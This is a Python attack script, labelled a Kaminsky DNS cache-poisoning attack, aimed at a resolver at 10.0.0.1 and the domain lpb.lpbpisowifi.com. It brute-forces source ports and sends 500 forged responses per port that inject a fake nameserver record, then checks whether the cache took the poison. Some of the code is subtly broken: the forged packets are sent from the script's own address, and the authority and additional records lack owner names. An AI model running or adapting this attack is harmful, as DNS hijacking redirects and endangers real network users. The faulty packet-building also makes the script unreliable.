import scapy.all as scapy
import threading
import time
import struct
import socket
import random

TARGET = "10.0.0.1"
OUR_IP = "10.0.20.233"

scapy.conf.use_pcap = True

found_port = [None]
scan_complete = threading.Event()

def dns_poison_attempt(port):
    """Try to poison DNS cache via a specific source port"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    
    # Generate a unique test domain
    unique = f"test{int(time.time())}{random.randint(1000,9999)}"
    test_domain = f"{unique}.lpb.lpbpisowifi.com"
    
    # Build query
    tid = random.randint(1, 65535)
    header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    qname = b""
    for part in test_domain.split("."):
        qname += bytes([len(part)]) + part.encode()
    qname += b"\x00"
    question = qname + struct.pack(">HH", 1, 1)
    query = header + question
    
    # Send the query
    s.sendto(query, (TARGET, 53))
    
    # Also send forged responses to the candidate source port
    fake_response_ip = "127.0.0.2"  # Distinct IP to verify
    
    # Try 500 TXIDs on this port
    for fake_tid in range(1, 501):
        # Build forged response
        resp_header = struct.pack(">HHHHHH", fake_tid, 0x8580, 1, 1, 1, 1)
        # Question
        resp_question = qname + struct.pack(">HH", 1, 1)
        # Answer: test domain -> 127.0.0.2
        answer = struct.pack(">H", 0xC00C) + struct.pack(">HHIH", 1, 1, 300, 4) + socket.inet_aton(fake_response_ip)
        # Authority: lpb.lpbpisowifi.com NS -> ns1.fake.com
        auth_qname = b""
        for part in "lpb.lpbpisowifi.com".split("."):
            auth_qname += bytes([len(part)]) + part.encode()
        auth_qname += b"\x00"
        auth_ns_name = b""
        for part in "ns1.fake.com".split("."):
            auth_ns_name += bytes([len(part)]) + part.encode()
        auth_ns_name += b"\x00"
        auth = struct.pack(">HHIH", 2, 1, 300, len(auth_ns_name)) + auth_ns_name
        # Additional: ns1.fake.com -> 10.0.0.1
        add_qname = b"\xc0\x18"
        add = struct.pack(">HHIH", 1, 1, 300, 4) + socket.inet_aton(fake_response_ip)
        
        forged = resp_header + resp_question + answer + auth + add
        
        # Send to target on the candidate port
        spoofed = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        spoofed.sendto(forged, (TARGET, port))
        spoofed.close()
    
    # Wait a bit then verify
    time.sleep(0.5)
    
    # Query for the test domain
    verify_tid = random.randint(1, 65535)
    verify_header = struct.pack(">HHHHHH", verify_tid, 0x0100, 1, 0, 0, 0)
    verify_query = verify_header + question
    
    try:
        s.sendto(verify_query, (TARGET, 53))
        data, _ = s.recvfrom(2048)
        # Parse response
        if len(data) > 12:
            _, flags, _, ancount, _, _ = struct.unpack(">HHHHHH", data[:12])
            rcode = flags & 0xF
            if rcode == 0 and ancount > 0:
                # Parse answer
                pos = 12
                while data[pos] != 0:
                    pos += data[pos] + 1
                pos += 5
                if data[pos] & 0xC0 == 0xC0:
                    pos += 2
                else:
                    while data[pos] != 0:
                        pos += data[pos] + 1
                    pos += 1
                _, _, _, rdlen = struct.unpack(">HHIH", data[pos:pos+10])
                pos += 10
                ip = socket.inet_ntoa(data[pos:pos+4])
                if ip == fake_response_ip:
                    print(f"\n[+] DNS CACHE POISONED! Source port: {port}")
                    print(f"    {test_domain} -> {ip}")
                    found_port[0] = port
                    scan_complete.set()
                    return True
    except:
        pass
    
    s.close()
    return False

print("=== DNS Cache Poisoning via Kaminsky Attack ===")
print("Scanning source ports in batches...")

# Scan ports in batches
batch_size = 100
start_port = 1025
end_port = 65535
total_ports = end_port - start_port + 1

for batch_start in range(start_port, end_port + 1, batch_size):
    if scan_complete.is_set():
        break
    
    batch_end = min(batch_start + batch_size - 1, end_port)
    print(f"\r[*] Scanning ports {batch_start}-{batch_end} ({batch_start-start_port}/{total_ports})", end="")
    
    for port in range(batch_start, batch_end + 1):
        if scan_complete.is_set():
            break
        dns_poison_attempt(port)
        time.sleep(0.01)  # Small delay between ports
    
    time.sleep(0.5)  # Batch delay

if found_port[0]:
    print(f"\n[+] Source port found: {found_port[0]}")
    print("[+] DNS cache can be poisoned!")
else:
    print(f"\n[-] Source port not found in scan")
    print("[-] The technique may not be working (port might not be reachable from LAN)")
